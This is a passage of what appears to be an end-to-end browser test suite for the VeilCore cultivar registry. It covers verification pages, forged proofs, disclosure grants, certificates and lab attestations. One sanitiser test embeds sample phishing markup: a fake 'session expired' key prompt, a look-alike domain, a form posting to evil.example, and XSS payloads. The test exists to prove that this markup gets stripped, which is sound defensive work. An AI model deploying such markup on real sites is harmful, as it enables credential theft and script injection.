      const key = await pg.evaluate(() => localStorage.getItem('veilcore.holder.v1'));
      const rendered = await pg.evaluate(() => document.body.innerText.length);
      expect(rendered, p).toBeGreaterThan(40);
      report[p] = { violations, errors, api: external.map((e) => e.url.replace(API, '')) };
      expect(violations, p).toEqual([]);
      expect(errors, p).toEqual([]);
      expect(key, p).toBeNull();
      expect(
        external.some((e) => e.url.includes('/api/')),
        p,
      ).toBe(false);
      expect(
        external.some((e) => e.url.includes('githubusercontent')),
        p,
      ).toBe(false);
      await ctx.close();
    }
    console.log('[pages]', JSON.stringify(report));
  }, 240_000);

  it('the docs render from the bundle with no styles, ids, forms or unsafe links', async () => {
    const { ctx, pg, external } = await page(() => undefined);
    await pg.goto(`${origin}/docs/spec`, { waitUntil: 'networkidle' });
    await pg.waitForSelector('h2', { timeout: 15_000 });
    const r = await pg.evaluate(() => {
      const root = document.querySelector('h2')?.parentElement as HTMLElement;
      return {
        styled: root.querySelectorAll('[style],[id],form,input,button,img').length,
        badLinks: [...root.querySelectorAll('a[href]')]
          .map((a) => a.getAttribute('href') ?? '')
          .filter((h) => !/^(#|\/(?!\/)|https:\/\/|mailto:)/i.test(h)),
        sourceLink: document.querySelector('a[href*="github.com/hunterincoming/veilcore-sdk"]')?.getAttribute('href'),
      };
    });
    expect(external).toEqual([]);
    expect(r.styled).toBe(0);
    expect(r.badLinks).toEqual([]);
    expect(r.sourceLink).toMatch(/\/blob\/[0-9a-f]{40}\/SPEC\.md$/);
    await ctx.close();
  }, 60_000);

  it('the docs sanitiser strips the round D phishing overlay (real DOMPurify, real settings)', async () => {
    const { DOC_SANITIZE, SAFE_HREF } = await import('./veilcore/docs');
    const { marked } = await import('marked');
    const md = [
      '# The record format',
      '<div id="vc-phish" style="position:fixed;inset:0;z-index:2147483647">',
      '<h2>Session expired — re-enter your VeilCore holder key</h2>',
      '<input id="vc-key" name="holderkey"><button id="vc-go">Restore</button>',
      '<a id="vc-link" href="https://veilc0re.org/restore">Continue</a> <a href="javascript:alert(1)">x</a> <a href="http://plain.example/">p</a>',
      '<form action="https://evil.example/collect"><input name="k"></form>',
      '</div>',
      '<img src=x onerror="window.__xss=1"><svg><script>window.__xss=3</script></svg>',
    ].join('\n');
    const dirty = marked.parse(md, { async: false });
    const ctx = await (browser as PwBrowser).newContext();
    const pg = await ctx.newPage();
    await pg.goto('about:blank');
    await pg.addScriptTag({ path: path.resolve(HERE, '../../node_modules/dompurify/dist/purify.js') });
    const out = await pg.evaluate(
      ({ html, cfg, safe }: { html: string; cfg: object; safe: string }) => {
        const re = new RegExp(safe, 'i');
        const P = (
          window as unknown as {
            DOMPurify: {
              addHook: (h: string, f: (n: Element) => void) => void;
              sanitize: (h: string, c: object) => string;
            };
          }
        ).DOMPurify;
        P.addHook('afterSanitizeAttributes', (n) => {
          if (n.tagName === 'A' && !re.test(n.getAttribute('href') ?? '')) n.removeAttribute('href');
        });
        const div = document.createElement('div');
        div.innerHTML = P.sanitize(html, cfg);
        document.body.appendChild(div);
        return {
          html: div.innerHTML,
          fixed: [...div.querySelectorAll('*')].some((e) => getComputedStyle(e).position === 'fixed'),
          inputs: div.querySelectorAll('input,button,form').length,
          hrefs: [...div.querySelectorAll('a[href]')].map((a) => a.getAttribute('href')),
          xss: (window as unknown as { __xss?: number }).__xss ?? 0,
        };
      },
      { html: dirty, cfg: DOC_SANITIZE, safe: SAFE_HREF.source },
    );
    expect(out.fixed).toBe(false);
    expect(out.inputs).toBe(0);
    expect(out.html).not.toMatch(/style=|id="vc-/);
    expect(out.hrefs).toEqual(['https://veilc0re.org/restore']); // https kept, opened as a new tab
    expect(out.xss).toBe(0);
    await ctx.close();
  }, 60_000);

  const FP = 'a'.repeat(64);

  it('verify page: a registry claiming "anchored on mainnet" with a proof for another record gets no tick and no "Anchored"', async () => {
    const { buildBatch } = await import('veilcore-records');
    const other = 'b'.repeat(64);
    const { proofs } = await buildBatch([other], 'forged');
    const { ctx, pg, violations } = await page((u) =>
      u.startsWith('/verify/')
        ? {
            found: true,
            id: 'VEIL-X',
            cultivar: 'Anything',
            recordFingerprint: FP,
            anchored: true,
            anchor: { network: 'mainnet', txHash: 'dead' },
            disclosed: [],
            signedAttestation: true,
            attestedByVettedLab: true,
            attested: true,
          }
        : u.startsWith('/proof/')
          ? { ...proofs[other], anchor: { chain: 'midnight', network: 'mainnet', txHash: 'dead' } }
          : u.startsWith('/attestations/')
            ? { attestations: [] }
            : undefined,
    );
    await pg.goto(`${origin}/verify/VEIL-X`, { waitUntil: 'networkidle' });
    await pg.waitForSelector('text=No inclusion proof this page could check', { timeout: 15_000 });
    const text = await pg.evaluate(() => document.body.innerText);
    const badge = await pg.evaluate(() => document.querySelector('[data-checked]')?.getAttribute('data-checked'));
    expect(text).not.toMatch(/Anchored on/);
    expect(text).not.toMatch(/fingerprint is intact/);
    expect(text).toMatch(/none could be verified in this browser/);
    expect(badge).toBe('no');
    expect(violations).toEqual([]);
    await ctx.close();
  }, 60_000);

  it('verify page: nothing sealed → grey mark; a genuine proof → tick, with the anchor as the registry’s report', async () => {
    {
      const { ctx, pg } = await page((u) =>
        u.startsWith('/verify/') ? { found: true, cultivar: 'Unsealed', disclosed: [] } : undefined,
      );
      await pg.goto(`${origin}/verify/VEIL-Y`, { waitUntil: 'networkidle' });
      await pg.waitForSelector('text=Record found — nothing sealed', { timeout: 15_000 });
      expect(await pg.evaluate(() => document.querySelector('[data-checked]')?.getAttribute('data-checked'))).toBe(
        'no',
      );
      await ctx.close();
    }
    const { buildBatch } = await import('veilcore-records');
    const { proofs } = await buildBatch([FP, 'c'.repeat(64)], 'real');
    const { ctx, pg } = await page((u) =>
      u.startsWith('/verify/')
        ? {
            found: true,
            cultivar: 'Sealed',
            recordFingerprint: FP,
            anchored: true,
            anchor: { network: 'preprod', txHash: 'beef' },
            disclosed: [],
          }
        : u.startsWith('/proof/')
          ? { ...proofs[FP], anchor: { chain: 'midnight', network: 'preprod', txHash: 'beef' } }
          : undefined,
    );
    await pg.goto(`${origin}/verify/VEIL-Z`, { waitUntil: 'networkidle' });
    await pg.waitForSelector('text=In a sealed batch · anchor reported, not checked', { timeout: 15_000 });
    const text = await pg.evaluate(() => document.body.innerText);
    expect(text).toMatch(/Checked in this browser: this fingerprint is in batch real/);
    expect(text).toMatch(/This page has not looked it up/);
    expect(await pg.evaluate(() => document.querySelector('[data-checked]')?.getAttribute('data-checked'))).toBe('yes');
    await ctx.close();
  }, 60_000);

  it('verify page: "not shared" is never shown as "not paired"; refused keys are named', async () => {
    const { ctx, pg, external } = await page((u) =>
      u.startsWith('/verify/')
        ? {
            found: true,
            cultivar: 'Secret Cross',
            recordFingerprint: FP,
            disclosed: ['own'],
            priorPossession: false,
            notGranted: ['parents', 'method'],
            notGrantedReason: "the record's holder has not chosen to share these",
          }
        : undefined,
    );
    await pg.goto(`${origin}/verify/VEIL-X?show=existence,parent-names,breeding-method`, { waitUntil: 'networkidle' });
    await pg.waitForSelector('text=Not shared by the holder', { timeout: 15_000 });
    const text = await pg.evaluate(() => document.body.innerText);
    expect(text).toMatch(/Not shared by the holder: Whether you paired a DNA report/);
    expect(text).not.toMatch(/not (yet )?paired/i);
    expect(text).toMatch(
      /This link asked for Parent cultivar names; Breeding method, which the holder has not chosen to share/,
    );
    expect(text).not.toMatch(/Mother|Breeding method, as the holder/);
    // The request carries no key and nothing that could widen the answer.
    const req = external.find((e) => e.url.includes('/verify/'));
    expect(req?.url).toContain('show=existence%2Cparent-names%2Cbreeding-method');
    await ctx.close();
  }, 60_000);

  it('record page: the choice is saved as a grant before the link appears; a refused save shows no link', async () => {
    const { fingerprintRecord } = await import('./veilcore/commitment');
    const rec = {
      id: 'VEIL-A',
      strainName: 'Grant Test',
      bredBy: 'H',
      dateCreated: '2026-01-01',
      notes: '',
      loggedAt: Date.UTC(2026, 0, 1),
      nonce: '2'.repeat(64),
    };
    const record = { ...rec, recordFingerprint: await fingerprintRecord(rec) };
    for (const refuse of [false, true]) {
      const { ctx, pg, external, violations, errors } = await page(
        (u, method, body) => {
          if (u === '/api/records' && method === 'GET') return [record];
          if (u === '/api/licenses') return [];
          if (u.endsWith('/disclosure') && method === 'GET') return { recordId: 'VEIL-A', show: [], updatedAt: null };
          if (u.endsWith('/disclosure') && method === 'PUT')
            return refuse
              ? { __status: 404, body: { error: 'no such record under this holder key' } }
              : {
                  recordId: 'VEIL-A',
                  show: (JSON.parse(body ?? '{}') as { show: string[] }).show,
                  updatedAt: '2026-10-04T00:00:00.000Z',
                };
          return undefined;
        },
        () => {
          localStorage.setItem('veilcore.holder.v1', '9'.repeat(64));
          localStorage.setItem('veilcore.role.v1', 'breeder');
        },
      );
      await pg.goto(`${origin}/record/VEIL-A`, { waitUntil: 'networkidle' });
      await pg.getByRole('button', { name: 'What strangers see' }).click();
      await pg.getByLabel('Parent cultivar names').check();
      await pg.getByRole('button', { name: /Save this choice/ }).click();
      if (refuse) {
        await pg.waitForSelector('text=Your choice was not saved, so no link was made', { timeout: 15_000 });
        expect(await pg.locator('input[value*="/verify/"]').count()).toBe(0);
      } else {
        await pg.waitForSelector('text=Saved on the registry', { timeout: 15_000 });
        expect(await pg.locator('input[value="https://veilcore.org/verify/VEIL-A"]').count()).toBe(1);
      }
      const put = external.find((e) => e.method === 'PUT' && e.url.endsWith('/disclosure'));
      expect(JSON.parse(put?.body ?? '{}')).toEqual({
        show: ['existence', 'attestation-status', 'descent-clean', 'sealed-at', 'parent-names'],
      });
      expect(violations).toEqual([]);
      expect(errors).toEqual([]);
      await ctx.close();
    }
  }, 120_000);

  it('certificate: no "✓ undefined", no anchor from a proof about another record, and the PNG renders under Trusted Types', async () => {
    const { fingerprintRecord } = await import('./veilcore/commitment');
    const { buildBatch } = await import('veilcore-records');
    const rec = {
      id: 'VEIL-C',
      strainName: 'Cert Test',
      bredBy: 'H',
      dateCreated: '2026-01-01',
      notes: '',
      loggedAt: Date.UTC(2026, 0, 1),
      nonce: '3'.repeat(64),
    };
    const record = {
      ...rec,
      recordFingerprint: await fingerprintRecord(rec),
      // What the registry writes when a transfer is claimed: no lab name.
      attestation: { addressedTo: 'bob', type: 'receipt-confirmed', attestedAt: Date.UTC(2026, 1, 1) },
    };
    const other = 'b'.repeat(64);
    const { proofs } = await buildBatch([other], 'forged');
    const { ctx, pg, violations, errors } = await page(
      (u, method) => {
        if (u === '/api/records' && method === 'GET') return [record];
        if (u === '/api/licenses') return [];
        if (u.startsWith('/proof/'))
          return { ...proofs[other], anchor: { chain: 'midnight', network: 'mainnet', txHash: 'dead' } };
        return undefined;
      },
      () => {
        localStorage.setItem('veilcore.holder.v1', '7'.repeat(64));
        localStorage.setItem('veilcore.role.v1', 'breeder');
      },
    );
    await pg.goto(`${origin}/record/VEIL-C`, { waitUntil: 'networkidle' });
    await pg.getByRole('button', { name: 'Evidence package' }).click();
    await pg.waitForSelector('text=Second-party confirmation', { timeout: 15_000 });
    await pg.waitForTimeout(500);
    const text = await pg.evaluate(() => document.body.innerText);
    expect(text).not.toMatch(/undefined/);
    expect(text).not.toMatch(/anchored on|tx dead/i);
    expect(text).toMatch(/Delivery taken via a transfer code/);
    expect(text).toMatch(/fingerprint recomputed from the stored fields: it matches/);
    await pg.getByRole('button', { name: 'Download (PNG)' }).click();
    await pg.waitForSelector('text=Certificate downloaded.', { timeout: 20_000 });
    expect(violations).toEqual([]);
    expect(errors).toEqual([]);
    await ctx.close();
  }, 90_000);

  it('claiming as a lab: the exact subject is shown, nothing is signed until the lab says so, and a failed signature is reported', async () => {
    const { generateKeypair } = await import('veilcore-records');
    const lab = await generateKeypair();
    const B = 'b'.repeat(64);
    const profile = JSON.stringify({ keypair: lab, displayName: 'Test Lab', role: 'laboratory', registeredAt: 1 });
    let claimed = false;
    const received = {
      id: 'VEIL-R',
      strainName: 'Blue',
      bredBy: 'S',
      dateCreated: '2026-01-01',
      notes: '',
      breedingMethod: '',
      parents: [],
      photoFingerprints: [],
      refId: '',
      loggedAt: Date.UTC(2026, 9, 4),
      nonce: '4'.repeat(64),
      recordFingerprint: '',
      receivedFrom: 'VEIL-S',
      receivedFromCommitment: B,
      quantity: '10 cuttings',
    };
    const { ctx, pg, external, errors } = await page(
      (u, method) => {
        if (u === '/transfers/TR-1/claim' && method === 'POST') {
          claimed = true;
          return { recordId: 'VEIL-R', descendedFrom: 'VEIL-S', parentCommitment: B };
        }
        if (u === '/api/records' && method === 'GET') return claimed ? [received] : [];
        if (u === '/api/records' && method === 'PUT') return { ok: true, count: 1 };
        if (u === '/api/licenses') return [];
        if (u.startsWith('/verify/VEIL-S')) return { found: true, recordFingerprint: B, disclosed: [] };
        if (u === '/attestations' && method === 'POST') return { __status: 503, body: { error: 'registry down' } };
        return undefined;
      },
      // Runs in the page: the keys have to be literal there.
      () => {
        localStorage.setItem('veilcore.holder.v1', '6'.repeat(64));
        localStorage.setItem('veilcore.role.v1', 'lab');
      },
    );
    await pg.goto(`${origin}/records`, { waitUntil: 'networkidle' });
    await pg.evaluate((p: string) => localStorage.setItem('veilcore.attester.v1', p), profile);
    await pg.goto(`${origin}/records`, { waitUntil: 'networkidle' });
    await pg.getByRole('button', { name: 'Receive a cultivar' }).click();
    await pg.getByLabel('Transfer code').fill('TR-1.abc');
    await pg.getByRole('button', { name: 'Claim transfer' }).click();
    await pg.waitForSelector('text=Sign what you received?', { timeout: 15_000 });
    const text = await pg.evaluate(() => document.body.innerText);
    expect(text).toContain(B);
    expect(text).toContain(lab.publicKey);
    expect(text).toMatch(/I received 10 cuttings of Blue from record VEIL-S/);
    expect(external.some((e) => e.url.endsWith('/attestations'))).toBe(false);
    await pg.getByLabel('I physically received this material.').check();
    await pg.getByRole('button', { name: 'Sign with my key' }).click();
    await pg.waitForSelector('text=your signed confirmation was not: registry down', { timeout: 15_000 });
    const posted = external.find((e) => e.url.endsWith('/attestations'));
    expect((JSON.parse(posted?.body ?? '{}') as { subjectCommitment?: string }).subjectCommitment).toBe(B);
    expect(errors).toEqual([]);
    await ctx.close();
  }, 90_000);

  it('an idle app tab with a key polls no faster than every 30 s', async () => {
    const { ctx, pg, external } = await page(
      (u) => (u.startsWith('/api/') ? [] : undefined),
      () => localStorage.setItem('veilcore.holder.v1', '8'.repeat(64)),
    );
    await pg.goto(`${origin}/records`, { waitUntil: 'networkidle' });
    const first = external.filter((e) => e.url.endsWith('/api/records')).length;
    await pg.waitForTimeout(21_000);
    expect(first).toBe(1);
    expect(external.filter((e) => e.url.endsWith('/api/records')).length).toBe(1);
    await ctx.close();
  }, 60_000);
});
